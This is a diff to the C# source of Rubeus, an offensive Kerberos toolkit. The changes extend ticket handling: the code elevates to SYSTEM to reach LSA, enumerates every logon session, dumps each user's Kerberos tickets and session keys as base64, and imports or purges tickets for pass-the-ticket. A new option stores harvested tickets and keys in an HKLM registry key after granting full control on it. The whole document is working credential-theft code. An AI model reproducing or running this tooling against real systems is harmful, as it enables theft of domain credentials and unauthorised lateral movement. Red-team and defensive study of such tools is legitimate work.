@@ -4,6 +4,12 @@ using System.Collections.Generic;
 using System.ComponentModel;
 using System.Runtime.InteropServices;
 using System.Text.RegularExpressions;
+using System.Security;
+using System.Reflection;
+using System.Security.AccessControl;
+using Microsoft.Win32;
+using ConsoleTables;
+using System.Security.Principal;
 
 namespace Rubeus
 {
@@ -28,10 +34,11 @@ namespace Rubeus
             return lsaHandle;
         }
 
-        public static uint CreateProcessNetOnly(string commandLine, bool show = false)
+        public static Interop.LUID CreateProcessNetOnly(string commandLine, bool show = false)
         {
             // creates a hidden process with random /netonly credentials,
             //  displayng the process ID and LUID, and returning the LUID
+
             // Note: the LUID can be used with the "ptt" action
 
             Console.WriteLine("\r\n[*] Action: Create Process (/netonly)\r\n");
@@ -46,14 +53,14 @@ namespace Rubeus
                 si.dwFlags = 0x00000001;
             }
             Console.WriteLine("[*] Showing process : {0}", show);
-            uint luid = 0;
+            Interop.LUID luid = new Interop.LUID();
 
             // 0x00000002 == LOGON_NETCREDENTIALS_ONLY
             if (!Interop.CreateProcessWithLogonW(Helpers.RandomString(8), Helpers.RandomString(8), Helpers.RandomString(8), 0x00000002, commandLine, String.Empty, 0, 0, null, ref si, out pi))
             {
                 uint lastError = Interop.GetLastError();
                 Console.WriteLine("[X] CreateProcessWithLogonW error: {0}", lastError);
-                return 0;
+                return new Interop.LUID();
             }
 
             Console.WriteLine("[+] Process         : '{0}' successfully created with LOGON_TYPE = 9", commandLine);
@@ -66,7 +73,7 @@ namespace Rubeus
             {
                 uint lastError = Interop.GetLastError();
                 Console.WriteLine("[X] OpenProcessToken error: {0}", lastError);
-                return 0;
+                return new Interop.LUID();
             }
 
             int TokenInfLength = 0;
@@ -83,9 +90,16 @@ namespace Rubeus
             if (Result)
             {
                 Interop.TOKEN_STATISTICS TokenStats = (Interop.TOKEN_STATISTICS)Marshal.PtrToStructure(TokenInformation, typeof(Interop.TOKEN_STATISTICS));
-                Interop.LUID authId = TokenStats.AuthenticationId;
-                Console.WriteLine("[+] LUID            : {0}", authId.LowPart);
-                luid = authId.LowPart;
+                luid = new Interop.LUID(TokenStats.AuthenticationId);
+                Console.WriteLine("[+] LUID            : {0}", luid);
+            }
+            else
+            {
+                uint lastError = Interop.GetLastError();
+                Console.WriteLine("[X] GetTokenInformation error: {0}", lastError);
+                Marshal.FreeHGlobal(TokenInformation);
+                Interop.CloseHandle(hToken);
+                return new Interop.LUID();
             }
 
             Marshal.FreeHGlobal(TokenInformation);
@@ -94,7 +108,7 @@ namespace Rubeus
             return luid;
         }
 
-        public static void ImportTicket(byte[] ticket, uint targetLuid = 0)
+        public static void ImportTicket(byte[] ticket, Interop.LUID targetLuid)
         {
             Console.WriteLine("\r\n[*] Action: Import Ticket");
 
@@ -105,7 +119,7 @@ namespace Rubeus
             int AuthenticationPackage;
             int ntstatus, ProtocalStatus;
 
-            if(targetLuid != 0)
+            if((ulong)targetLuid != 0)
             {
                 if(!Helpers.IsHighIntegrity())
                 {
@@ -151,7 +165,8 @@ namespace Rubeus
                 if (ntstatus != 0)
                 {
                     uint winError = Interop.LsaNtStatusToWinError((uint)ntstatus);
-                    Console.WriteLine("[X] Windows error running LsaLookupAuthenticationPackage: {0}", winError);
+                    string errorMessage = new Win32Exception((int)winError).Message;
+                    Console.WriteLine("[X] Error {0} running LsaLookupAuthenticationPackage: {1}", winError, errorMessage);
                     return;
                 }
                 Interop.KERB_SUBMIT_TKT_REQUEST request = new Interop.KERB_SUBMIT_TKT_REQUEST();
@@ -159,13 +174,10 @@ namespace Rubeus
                 request.KerbCredSize = ticket.Length;
                 request.KerbCredOffset = Marshal.SizeOf(typeof(Interop.KERB_SUBMIT_TKT_REQUEST));
 
-                if(targetLuid != 0)
+                if((ulong)targetLuid != 0)
                 {
-                    Console.WriteLine("[*] Target LUID: 0x{0:x}", targetLuid);
-                    Interop.LUID luid = new Interop.LUID();
-                    luid.LowPart = targetLuid;
-                    luid.HighPart = 0;
-                    request.LogonId = luid;
+                    Console.WriteLine("[*] Target LUID: 0x{0:x}", (ulong)targetLuid);
+                    request.LogonId = targetLuid;
                 }
 
                 int inputBufferSize = Marshal.SizeOf(typeof(Interop.KERB_SUBMIT_TKT_REQUEST)) + ticket.Length;
@@ -176,13 +188,15 @@ namespace Rubeus
                 if (ntstatus != 0)
                 {
                     uint winError = Interop.LsaNtStatusToWinError((uint)ntstatus);
-                    Console.WriteLine("[X] Windows error running LsaCallAuthenticationPackage: {0}", winError);
+                    string errorMessage = new Win32Exception((int)winError).Message;
+                    Console.WriteLine("[X] Error {0} running LsaLookupAuthenticationPackage: {1}", winError, errorMessage);
                     return;
                 }
                 if (ProtocalStatus != 0)
                 {
                     uint winError = Interop.LsaNtStatusToWinError((uint)ProtocalStatus);
-                    Console.WriteLine("[X] Windows error running LsaCallAuthenticationPackage/ProtocalStatus: {0}", winError);
+                    string errorMessage = new Win32Exception((int)winError).Message;
+                    Console.WriteLine("[X] Error {0} running LsaLookupAuthenticationPackage (ProtocalStatus): {1}", winError, errorMessage);
                     return;
                 }
                 Console.WriteLine("[+] Ticket successfully imported!");
@@ -195,7 +209,7 @@ namespace Rubeus
             }
         }
 
-        public static void Purge(uint targetLuid = 0)
+        public static void Purge(Interop.LUID targetLuid)
         {
             Console.WriteLine("\r\n[*] Action: Purge Tickets");
 
@@ -206,7 +220,7 @@ namespace Rubeus
             int AuthenticationPackage;
             int ntstatus, ProtocalStatus;
 
-            if (targetLuid != 0)
+            if ((ulong)targetLuid != 0)
             {
                 if (!Helpers.IsHighIntegrity())
                 {
@@ -252,31 +266,19 @@ namespace Rubeus
                 if (ntstatus != 0)
                 {
                     uint winError = Interop.LsaNtStatusToWinError((uint)ntstatus);
-                    Console.WriteLine("[X] Windows error running LsaLookupAuthenticationPackage: {0}", winError);
+                    string errorMessage = new Win32Exception((int)winError).Message;
+                    Console.WriteLine("[X] Error {0} running LsaLookupAuthenticationPackage: {1}", winError, errorMessage);
                     return;
                 }
 
                 Interop.KERB_PURGE_TKT_CACHE_REQUEST request = new Interop.KERB_PURGE_TKT_CACHE_REQUEST();
                 request.MessageType = Interop.KERB_PROTOCOL_MESSAGE_TYPE.KerbPurgeTicketCacheMessage;
 
-                if (targetLuid != 0)
+                if ((ulong)targetLuid != 0)
                 {
-                    Console.WriteLine("[*] Target LUID: 0x{0:x}", targetLuid);
-                    Interop.LUID luid = new Interop.LUID();
-                    luid.LowPart = targetLuid;
-                    luid.HighPart = 0;
-                    request.LogonId = luid;
+                    Console.WriteLine("[*] Target LUID: 0x{0:x}", (ulong)targetLuid);
+                    request.LogonId = targetLuid;
                 }
-
-                //Interop.LSA_STRING_IN ServerName;
-                //ServerName.Length = 0;
-                //ServerName.MaximumLength = 0;
-                //ServerName.Buffer = null;
-
-                //Interop.LSA_STRING_IN RealmName;
-                //ServerName.Length = 0;
-                //ServerName.MaximumLength = 0;
-                //ServerName.Buffer = null;
 
                 int inputBufferSize = Marshal.SizeOf(typeof(Interop.KERB_PURGE_TKT_CACHE_REQUEST));
                 inputBuffer = Marshal.AllocHGlobal(inputBufferSize);
@@ -285,13 +287,15 @@ namespace Rubeus
                 if (ntstatus != 0)
                 {
                     uint winError = Interop.LsaNtStatusToWinError((uint)ntstatus);
-                    Console.WriteLine("[X] Windows error running LsaCallAuthenticationPackage: {0}", winError);
+                    string errorMessage = new Win32Exception((int)winError).Message;
+                    Console.WriteLine("[X] Error {0} running LsaLookupAuthenticationPackage: {1}", winError, errorMessage);
                     return;
                 }
                 if (ProtocalStatus != 0)
                 {
                     uint winError = Interop.LsaNtStatusToWinError((uint)ProtocalStatus);
-                    Console.WriteLine("[X] Windows error running LsaCallAuthenticationPackage/ProtocalStatus: {0}", winError);
+                    string errorMessage = new Win32Exception((int)winError).Message;
+                    Console.WriteLine("[X] Error {0} running LsaLookupAuthenticationPackage (ProtocolStatus): {1}", winError, errorMessage);
                     return;
                 }
                 Console.WriteLine("[+] Tickets successfully purged!");
@@ -304,20 +308,35 @@ namespace Rubeus
             }
         }
 
-        public static void ListKerberosTicketData(uint targetLuid = 0, string targetService = "", bool monitor = false)
+        public static void ListKerberosTicketData(Interop.LUID targetLuid, string targetService = "", bool monitor = false, string registryBasePath = null)
         {
-            // lists 
             if (Helpers.IsHighIntegrity())
             {
-                ListKerberosTicketDataAllUsers(targetLuid, targetService, monitor);
+                ListKerberosTicketDataAllUsers(targetLuid, targetService, monitor, false, registryBasePath);
             }
             else
             {
+                if (registryBasePath != null)
+                {
+                    Console.WriteLine("[X] Registry option was passed but will not be used, as we require elevated rights to write to HKLM.");
+                }
                 ListKerberosTicketDataCurrentUser(targetService);
             }
         }
 
-        public static void ListKerberosTicketDataAllUsers(uint targetLuid = 0, string targetService = "", bool monitor = false, bool harvest = false)
+        public static void ListKerberosTickets(Interop.LUID targetLuid)
+        {
+            if (Helpers.IsHighIntegrity())
+            {
+                ListKerberosTicketsAllUsers(targetLuid);
+            }
+            else
+            {
+                ListKerberosTicketsCurrentUser();
+            }
+        }
+
+        public static void ListKerberosTicketDataAllUsers(Interop.LUID targetLuid, string targetService = "", bool monitor = false, bool harvest = false, string registryBasePath = null)
         {
             // extracts Kerberos ticket data for all users on the system (assuming elevation)
 
@@ -331,14 +350,50 @@ namespace Rubeus
             // and https://www.dreamincode.net/forums/topic/135033-increment-memory-pointer-issue/
             // also Jared Atkinson's work at https://github.com/Invoke-IR/ACE/blob/master/ACE-Management/PS-ACE/Scripts/ACE_Get-KerberosTicketCache.ps1
 
+            Microsoft.Win32.RegistryKey baseKey = null;
+            Microsoft.Win32.RegistryKey userData = null;
+            string user = null;
             if (!monitor)
             {
                 Console.WriteLine("\r\n\r\n[*] Action: Dump Kerberos Ticket Data (All Users)\r\n");
             }
-
-            if (targetLuid != 0)
+            else
             {
-                Console.WriteLine("[*] Target LUID     : 0x{0:x}", targetLuid);
+                if (Environment.UserName == "SYSTEM")
+                {
+                    user = "NT AUTHORITY\\SYSTEM";
+                }
+                else
+                {
+                    user = Environment.UserDomainName + "\\" + Environment.UserName;
+                };
+                if (registryBasePath != null)
+                {
+                    try
+                    {
+                        Registry.LocalMachine.CreateSubKey(registryBasePath);
+                        baseKey = Registry.LocalMachine.OpenSubKey(registryBasePath, RegistryKeyPermissionCheck.ReadWriteSubTree);
+                        RegistrySecurity rs = baseKey.GetAccessControl();
+                        RegistryAccessRule rar = new RegistryAccessRule(
+                            user,
+                            RegistryRights.FullControl,
+                            InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit,
+                            PropagationFlags.None,
+                            AccessControlType.Allow);
+                        rs.AddAccessRule(rar);
+                        baseKey.SetAccessControl(rs);
+                    }
+                    catch
+                    {
+                        Console.WriteLine("[-] Error setting correct ACLs for HKLM:\\{0}", registryBasePath);
+                        baseKey = null;
+                    }
+                }
+            }
+
+            if ((ulong)targetLuid != 0)
+            {
+                Console.WriteLine("[*] Target LUID: 0x{0:x}", (ulong)targetLuid);
             }
             if (!String.IsNullOrEmpty(targetService))
             {
@@ -426,12 +481,10 @@ namespace Rubeus
                         Interop.KERB_TICKET_CACHE_INFO ticket;
 
                         // input object for querying the ticket cache for a specific logon ID
-                        Interop.LUID userLogonID = new Interop.LUID();
-                        userLogonID.LowPart = data.LoginID.LowPart;
-                        userLogonID.HighPart = 0;
+                        Interop.LUID userLogonID = new Interop.LUID(data.LoginID);
                         tQuery.LogonId = userLogonID;
 
-                        if ((targetLuid == 0) || (data.LoginID.LowPart == targetLuid))
+                        if (((ulong)targetLuid == 0) || (data.LoginID == targetLuid))
                         {
                             tQuery.MessageType = Interop.KERB_PROTOCOL_MESSAGE_TYPE.KerbQueryTicketCacheMessage;
 
@@ -448,9 +501,25 @@ namespace Rubeus
 
                                 if (count2 != 0)
                                 {
+                                    if (baseKey != null)
+                                    {
+                                        baseKey.CreateSubKey(username + "@" + domain);
+                                        userData = baseKey.OpenSubKey(username + "@" + domain, RegistryKeyPermissionCheck.ReadWriteSubTree);
+                                        userData.SetValue("Username", username);
+                                        userData.SetValue("Domain", domain);
+                                        userData.SetValue("LoginId", data.LoginID.LowPart.ToString());
+                                        userData.SetValue("UserSID", sid.Value.ToString());
+                                        userData.SetValue("AuthenticationPackage", authpackage.ToString());
+                                        userData.SetValue("LogonType", logonType.ToString());
+                                        userData.SetValue("LogonTime", logonTime.ToString());
+                                        userData.SetValue("LogonServer", logonServer.ToString());
+                                        userData.SetValue("LogonServerDNSDomain", dnsDomainName.ToString());
+                                        userData.SetValue("UserPrincipalName", upn.ToString());
+                                    }
+
                                     Console.WriteLine("\r\n  UserName                 : {0}", username);
                                     Console.WriteLine("  Domain                   : {0}", domain);
-                                    Console.WriteLine("  LogonId                  : {0}", data.LoginID.LowPart);
+                                    Console.WriteLine("  LogonId                  : {0}", data.LoginID);
                                     Console.WriteLine("  UserSID                  : {0}", sid.Value);
                                     Console.WriteLine("  AuthenticationPackage    : {0}", authpackage);
                                     Console.WriteLine("  LogonType                : {0}", logonType);
@@ -547,6 +616,13 @@ namespace Rubeus
                                                         string serviceNameStr2 = Marshal.PtrToStringUni(serviceNameStruct.Names[1].Buffer, serviceNameStruct.Names[1].Length / 2).Trim();
                                                         serviceName = String.Format("{0}/{1}", serviceNameStr1, serviceNameStr2);
                                                     }
+                                                    else if (serviceNameStruct.NameCount == 3)
+                                                    {
+                                                        string serviceNameStr1 = Marshal.PtrToStringUni(serviceNameStruct.Names[0].Buffer, serviceNameStruct.Names[0].Length / 2).Trim();
+                                                        string serviceNameStr2 = Marshal.PtrToStringUni(serviceNameStruct.Names[1].Buffer, serviceNameStruct.Names[1].Length / 2).Trim();
+                                                        string serviceNameStr3 = Marshal.PtrToStringUni(serviceNameStruct.Names[2].Buffer, serviceNameStruct.Names[2].Length / 2).Trim();
+                                                        serviceName = String.Format("{0}/{1}/{2}", serviceNameStr1, serviceNameStr2, serviceNameStr3);
+                                                    }
                                                     else { }
                                                 }
 
@@ -565,6 +641,13 @@ namespace Rubeus
                                                         string targetNameStr1 = Marshal.PtrToStringUni(targetNameStruct.Names[0].Buffer, targetNameStruct.Names[0].Length / 2).Trim();
                                                         string targetNameStr2 = Marshal.PtrToStringUni(targetNameStruct.Names[1].Buffer, targetNameStruct.Names[1].Length / 2).Trim();
                                                         targetName = String.Format("{0}/{1}", targetNameStr1, targetNameStr2);
+                                                    }
+                                                    else if (targetNameStruct.NameCount == 3)
+                                                    {
+                                                        string targetNameStr1 = Marshal.PtrToStringUni(targetNameStruct.Names[0].Buffer, targetNameStruct.Names[0].Length / 2).Trim();
+                                                        string targetNameStr2 = Marshal.PtrToStringUni(targetNameStruct.Names[1].Buffer, targetNameStruct.Names[1].Length / 2).Trim();
+                                                        string targetNameStr3 = Marshal.PtrToStringUni(targetNameStruct.Names[2].Buffer, targetNameStruct.Names[2].Length / 2).Trim();
+                                                        targetName = String.Format("{0}/{1}/{2}", targetNameStr1, targetNameStr2, targetNameStr3);
                                                     }
                                                     else { }
                                                 }
@@ -613,6 +696,25 @@ namespace Rubeus
                                                 byte[] encodedTicket = new byte[encodedTicketSize];
                                                 Marshal.Copy(response.Ticket.EncodedTicket, encodedTicket, 0, encodedTicketSize);
                                                 string base64TGT = Convert.ToBase64String(encodedTicket);
+                                                if (userData != null)
+                                                {
+                                                    userData.SetValue("ServiceName", serviceName);
+                                                    userData.SetValue("TargetName", targetName);
+                                                    userData.SetValue("ClientName", clientName);
+                                                    userData.SetValue("DomainName", domainName);
+                                                    userData.SetValue("TargetDomainName", targetDomainName);
+                                                    userData.SetValue("AltTargetDomainName", altTargetDomainName);
+                                                    userData.SetValue("SessionKeyType", sessionKeyType);
+                                                    userData.SetValue("Base64SessionKey", base64SessionKey);
+                                                    userData.SetValue("KeyExpirationTime", keyExpirationTime);
+                                                    userData.SetValue("TicketFlags", ticketFlags);
+                                                    userData.SetValue("StartTime", startTime);
+                                                    userData.SetValue("EndTime", endTime);
+                                                    userData.SetValue("RenewUntil", renewUntil);
+                                                    userData.SetValue("TimeSkew", timeSkew);
+                                                    userData.SetValue("EncodedTicketSize", encodedTicketSize);
+                                                    userData.SetValue("Base64EncodedTicket", base64TGT);
+                                                }
 
                                                 Console.WriteLine("    ServiceName              : {0}", serviceName);
                                                 Console.WriteLine("    TargetName               : {0}", targetName);
@@ -630,6 +732,7 @@ namespace Rubeus
                                                 Console.WriteLine("    TimeSkew                 : {0}", timeSkew);
                                                 Console.WriteLine("    EncodedTicketSize        : {0}", encodedTicketSize);
                                                 Console.WriteLine("    Base64EncodedTicket      :\r\n");
+                                                
                                                 // display the TGT, columns of 100 chararacters
                                                 foreach (string line in Helpers.Split(base64TGT, 100))
                                                 {
@@ -680,6 +783,188 @@ namespace Rubeus
             }
         }
 
+        public static void ListKerberosTicketsAllUsers(Interop.LUID targetLuid)
+        {
+            // lists Kerberos tickets for all users on the system (assuming elevation)
+
+            //  first elevates to SYSTEM and uses LsaRegisterLogonProcessHelper connect to LSA
+            //  then calls LsaCallAuthenticationPackage w/ a KerbQueryTicketCacheMessage message type to enumerate all cached tickets
+
+            // adapted partially from Vincent LE TOUX' work
+            //      https://github.com/vletoux/MakeMeEnterpriseAdmin/blob/master/MakeMeEnterpriseAdmin.ps1#L2939-L2950
+            // and https://www.dreamincode.net/forums/topic/135033-increment-memory-pointer-issue/
+            // also Jared Atkinson's work at https://github.com/Invoke-IR/ACE/blob/master/ACE-Management/PS-ACE/Scripts/ACE_Get-KerberosTicketCache.ps1
+
+            Console.WriteLine("\r\n\r\n[*] Action: List Kerberos Tickets (All Users)\r\n");
+
+            if ((ulong)targetLuid != 0)
+            {
+                Console.WriteLine("[*] Target LUID     : 0x{0:x}", (ulong)targetLuid);
+            }
+
+            int retCode;
+            int authPack;
+            string name = "kerberos";
+            Interop.LSA_STRING_IN LSAString;
+            LSAString.Length = (ushort)name.Length;
+            LSAString.MaximumLength = (ushort)(name.Length + 1);
+            LSAString.Buffer = name;
+
+            IntPtr lsaHandle = LsaRegisterLogonProcessHelper();
+
+            // if the original call fails then it is likely we don't have SeTcbPrivilege
+            // to get SeTcbPrivilege we can Impersonate a NT AUTHORITY\SYSTEM Token
+            if (lsaHandle == IntPtr.Zero)
+            {
+                string currentName = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
+                if (currentName == "NT AUTHORITY\\SYSTEM")
+                {
+                    // if we're already SYSTEM, we have the proper privilegess to get a Handle to LSA with LsaRegisterLogonProcessHelper
+                    lsaHandle = LsaRegisterLogonProcessHelper();
+                }
+                else
+                {
+                    // elevated but not system, so gotta GetSystem() first
+                    Helpers.GetSystem();
+                    // should now have the proper privileges to get a Handle to LSA
+                    lsaHandle = LsaRegisterLogonProcessHelper();
+                    // we don't need our NT AUTHORITY\SYSTEM Token anymore so we can revert to our original token
+                    Interop.RevertToSelf();
+                }
+            }
+
+            try
+            {
+                // obtains the unique identifier for the kerberos authentication package.
+                retCode = Interop.LsaLookupAuthenticationPackage(lsaHandle, ref LSAString, out authPack);
+
+                // first return all the logon sessions
+                DateTime systime = new DateTime(1601, 1, 1, 0, 0, 0, 0); //win32 systemdate
+                UInt64 count;
+                IntPtr luidPtr = IntPtr.Zero;
+                IntPtr iter = luidPtr;
+
+                uint ret = Interop.LsaEnumerateLogonSessions(out count, out luidPtr);  // get an array of pointers to LUIDs
+
+                for (ulong i = 0; i < count; i++)
+                {
+                    IntPtr sessionData;
+                    ret = Interop.LsaGetLogonSessionData(luidPtr, out sessionData);
+                    Interop.SECURITY_LOGON_SESSION_DATA data = (Interop.SECURITY_LOGON_SESSION_DATA)Marshal.PtrToStructure(sessionData, typeof(Interop.SECURITY_LOGON_SESSION_DATA));
+
+                    // if we have a valid logon
+                    if (data.PSiD != IntPtr.Zero)
+                    {
+                        // user session data
+                        string username = Marshal.PtrToStringUni(data.Username.Buffer).Trim();
+                        System.Security.Principal.SecurityIdentifier sid = new System.Security.Principal.SecurityIdentifier(data.PSiD);
+                        string domain = Marshal.PtrToStringUni(data.LoginDomain.Buffer).Trim();
+                        string authpackage = Marshal.PtrToStringUni(data.AuthenticationPackage.Buffer).Trim();
+                        Interop.SECURITY_LOGON_TYPE logonType = (Interop.SECURITY_LOGON_TYPE)data.LogonType;
+                        DateTime logonTime = systime.AddTicks((long)data.LoginTime);
+                        string logonServer = Marshal.PtrToStringUni(data.LogonServer.Buffer).Trim();
+                        string dnsDomainName = Marshal.PtrToStringUni(data.DnsDomainName.Buffer).Trim();
+                        string upn = Marshal.PtrToStringUni(data.Upn.Buffer).Trim();
+
+                        IntPtr ticketsPointer = IntPtr.Zero;
+                        DateTime sysTime = new DateTime(1601, 1, 1, 0, 0, 0, 0);
+
+                        int returnBufferLength = 0;
+                        int protocalStatus = 0;
+
+                        Interop.KERB_QUERY_TKT_CACHE_REQUEST tQuery = new Interop.KERB_QUERY_TKT_CACHE_REQUEST();
+                        Interop.KERB_QUERY_TKT_CACHE_RESPONSE tickets = new Interop.KERB_QUERY_TKT_CACHE_RESPONSE();
+                        Interop.KERB_TICKET_CACHE_INFO_EX ticket;
+
+                        // input object for querying the ticket cache for a specific logon ID
+                        Interop.LUID userLogonID = new Interop.LUID(data.LoginID);
+                        tQuery.LogonId = userLogonID;
+
+                        if (((ulong)targetLuid == 0) || (data.LoginID == targetLuid))
+                        {
+                            tQuery.MessageType = Interop.KERB_PROTOCOL_MESSAGE_TYPE.KerbQueryTicketCacheExMessage;
+
+                            // query LSA, specifying we want the ticket cache
+                            IntPtr tQueryPtr = Marshal.AllocHGlobal(Marshal.SizeOf(tQuery));
+                            Marshal.StructureToPtr(tQuery, tQueryPtr, false);
+                            retCode = Interop.LsaCallAuthenticationPackage(lsaHandle, authPack, tQueryPtr, Marshal.SizeOf(tQuery), out ticketsPointer, out returnBufferLength, out protocalStatus);
+
+                            if (ticketsPointer != IntPtr.Zero)
+                            {
+                                // parse the returned pointer into our initial KERB_QUERY_TKT_CACHE_RESPONSE structure
+                                tickets = (Interop.KERB_QUERY_TKT_CACHE_RESPONSE)Marshal.PtrToStructure((System.IntPtr)ticketsPointer, typeof(Interop.KERB_QUERY_TKT_CACHE_RESPONSE));
+                                int count2 = tickets.CountOfTickets;
+
+                                if (count2 != 0)
+                                {
+                                    Console.WriteLine("\r\n  UserName                 : {0}", username);
+                                    Console.WriteLine("  Domain                   : {0}", domain);
+                                    Console.WriteLine("  LogonId                  : {0}", data.LoginID);
+                                    Console.WriteLine("  UserSID                  : {0}", sid.Value);
+                                    Console.WriteLine("  AuthenticationPackage    : {0}", authpackage);
+                                    Console.WriteLine("  LogonType                : {0}", logonType);
+                                    Console.WriteLine("  LogonTime                : {0}", logonTime);
+                                    Console.WriteLine("  LogonServer              : {0}", logonServer);
+                                    Console.WriteLine("  LogonServerDNSDomain     : {0}", dnsDomainName);
+                                    Console.WriteLine("  UserPrincipalName        : {0}", upn);
+                                    Console.WriteLine();
+
+                                    // get the size of the structures we're iterating over
+                                    Int32 dataSize = Marshal.SizeOf(typeof(Interop.KERB_TICKET_CACHE_INFO_EX));
+
+                                    for (int j = 0; j < count2; j++)
+                                    {
+                                        // iterate through the result structures
+                                        IntPtr currTicketPtr = (IntPtr)(long)((ticketsPointer.ToInt64() + (int)(8 + j * dataSize)));
+
+                                        // parse the new ptr to the appropriate structure
+                                        ticket = (Interop.KERB_TICKET_CACHE_INFO_EX)Marshal.PtrToStructure(currTicketPtr, typeof(Interop.KERB_TICKET_CACHE_INFO_EX));
+
+                                        DateTime startTime = DateTime.FromFileTime(ticket.StartTime);
+                                        DateTime endTime = DateTime.FromFileTime(ticket.EndTime);
+                                        DateTime renewTime = DateTime.FromFileTime(ticket.RenewTime);
+
+                                        string ticketFlags = ((Interop.TicketFlags)ticket.TicketFlags).ToString();
+
+                                        // extract the server name/realm and client name/realm
+                                        string serverName = Marshal.PtrToStringUni(ticket.ServerName.Buffer, ticket.ServerName.Length / 2);
+                                        string serverRealm = Marshal.PtrToStringUni(ticket.ServerRealm.Buffer, ticket.ServerRealm.Length / 2);
+                                        string clientName = Marshal.PtrToStringUni(ticket.ClientName.Buffer, ticket.ClientName.Length / 2);
+                                        string clientRealm = Marshal.PtrToStringUni(ticket.ClientRealm.Buffer, ticket.ClientRealm.Length / 2);
+
+                                        Console.WriteLine("    [{0:x}] - 0x{1:x} - {2}", j, (int)ticket.EncryptionType, (Interop.KERB_ETYPE)ticket.EncryptionType);
+                                        Console.WriteLine("      Start/End/MaxRenew: {0} ; {1} ; {2}", startTime, endTime, renewTime);
+                                        Console.WriteLine("      Server Name       : {0} @ {1}", serverName, serverRealm);
+                                        Console.WriteLine("      Client Name       : {0} @ {1}", clientName, clientRealm);
+                                        Console.WriteLine("      Flags             : {0} ({1:x})", ticketFlags, ticket.TicketFlags);
+                                        Console.WriteLine();
+                                    }
+                                }
+                            }
+
+                            // cleanup
+                            Interop.LsaFreeReturnBuffer(ticketsPointer);
+                            Marshal.FreeHGlobal(tQueryPtr);
+                        }
+                    }
+
+                    // move the pointer forward
+                    luidPtr = (IntPtr)((long)luidPtr.ToInt64() + Marshal.SizeOf(typeof(Interop.LUID)));
+
+                    // cleaup
+                    Interop.LsaFreeReturnBuffer(sessionData);
+                }
+                Interop.LsaFreeReturnBuffer(luidPtr);
+
+                // disconnect from LSA
+                Interop.LsaDeregisterLogonProcess(lsaHandle);
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("[X] Exception: {0}", ex);
+            }
+        }
+
         public static void ListKerberosTicketDataCurrentUser(string targetService)
         {
             // extracts Kerberos ticket data for the current user
@@ -694,9 +979,13 @@ namespace Rubeus
             // also Jared Atkinson's work at https://github.com/Invoke-IR/ACE/blob/master/ACE-Management/PS-ACE/Scripts/ACE_Get-KerberosTicketCache.ps1
 
             Console.WriteLine("\r\n\r\n[*] Action: Dump Kerberos Ticket Data (Current User)\r\n");
+
+            Interop.LUID currentLUID = GetCurrentLUID();
+            Console.WriteLine("[*] Current LUID    : {0}\r\n", currentLUID);
+
             if (!String.IsNullOrEmpty(targetService))
             {
-                Console.WriteLine("\r\n[*] Target service  : {0:x}\r\n\r\n", targetService);
+                Console.WriteLine("[*] Target service  : {0:x}\r\n\r\n", targetService);
             }
 
             int totalTicketCount = 0;
@@ -819,6 +1108,13 @@ namespace Rubeus
                                 string serviceNameStr2 = Marshal.PtrToStringUni(serviceNameStruct.Names[1].Buffer, serviceNameStruct.Names[1].Length / 2).Trim();
                                 serviceName = String.Format("{0}/{1}", serviceNameStr1, serviceNameStr2);
                             }
+                            else if (serviceNameStruct.NameCount == 3)
+                            {
+                                string serviceNameStr1 = Marshal.PtrToStringUni(serviceNameStruct.Names[0].Buffer, serviceNameStruct.Names[0].Length / 2).Trim();
+                                string serviceNameStr2 = Marshal.PtrToStringUni(serviceNameStruct.Names[1].Buffer, serviceNameStruct.Names[1].Length / 2).Trim();
+                                string serviceNameStr3 = Marshal.PtrToStringUni(serviceNameStruct.Names[2].Buffer, serviceNameStruct.Names[2].Length / 2).Trim();
+                                serviceName = String.Format("{0}/{1}/{2}", serviceNameStr1, serviceNameStr2, serviceNameStr3);
+                            }
                             else { }
                         }
 
@@ -837,6 +1133,13 @@ namespace Rubeus
                                 string targetNameStr1 = Marshal.PtrToStringUni(targetNameStruct.Names[0].Buffer, targetNameStruct.Names[0].Length / 2).Trim();
                                 string targetNameStr2 = Marshal.PtrToStringUni(targetNameStruct.Names[1].Buffer, targetNameStruct.Names[1].Length / 2).Trim();
                                 targetName = String.Format("{0}/{1}", targetNameStr1, targetNameStr2);
+                            }
+                            else if (targetNameStruct.NameCount == 3)
+                            {
+                                string targetNameStr1 = Marshal.PtrToStringUni(targetNameStruct.Names[0].Buffer, targetNameStruct.Names[0].Length / 2).Trim();
+                                string targetNameStr2 = Marshal.PtrToStringUni(targetNameStruct.Names[1].Buffer, targetNameStruct.Names[1].Length / 2).Trim();
+                                string targetNameStr3 = Marshal.PtrToStringUni(targetNameStruct.Names[2].Buffer, targetNameStruct.Names[2].Length / 2).Trim();
+                                targetName = String.Format("{0}/{1}/{2}", targetNameStr1, targetNameStr2, targetNameStr3);
                             }
                             else { }
                         }
@@ -932,7 +1235,406 @@ namespace Rubeus
             Console.WriteLine("[*] Extracted  {0} total tickets\r\n", extractedTicketCount);
         }
 
-        public static List<KRB_CRED> ExtractTGTs(uint targetLuid = 0, bool includeComputerAccounts = false)
+        public static void ListKerberosTicketsCurrentUser()
+        {
+            // lists Kerberos tickets for the current user
+
+            //  first uses LsaConnectUntrusted to connect and LsaCallAuthenticationPackage w/ a KerbQueryTicketCacheMessage message type
+            //  to enumerate all cached tickets
+
+            // adapted partially from Vincent LE TOUX' work
+            //      https://github.com/vletoux/MakeMeEnterpriseAdmin/blob/master/MakeMeEnterpriseAdmin.ps1#L2939-L2950
+            // and https://www.dreamincode.net/forums/topic/135033-increment-memory-pointer-issue/
+            // also Jared Atkinson's work at https://github.com/Invoke-IR/ACE/blob/master/ACE-Management/PS-ACE/Scripts/ACE_Get-KerberosTicketCache.ps1
+
+            Console.WriteLine("\r\n\r\n[*] Action: List Kerberos Tickets (Current User)\r\n");
+
+            Interop.LUID currentLUID = GetCurrentLUID();
+            Console.WriteLine("[*] Current LUID    : {0}\r\n", currentLUID);
+
+            string name = "kerberos";
+            Interop.LSA_STRING_IN LSAString;
+            LSAString.Length = (ushort)name.Length;
+            LSAString.MaximumLength = (ushort)(name.Length + 1);
+            LSAString.Buffer = name;
+
+            IntPtr ticketsPointer = IntPtr.Zero;
+            int authPack;
+            int returnBufferLength = 0;
+            int protocalStatus = 0;
+            IntPtr lsaHandle;
+            int retCode;
+
+            // If we want to look at tickets from a session other than our own
+            //      then we need to use LsaRegisterLogonProcess instead of LsaConnectUntrusted
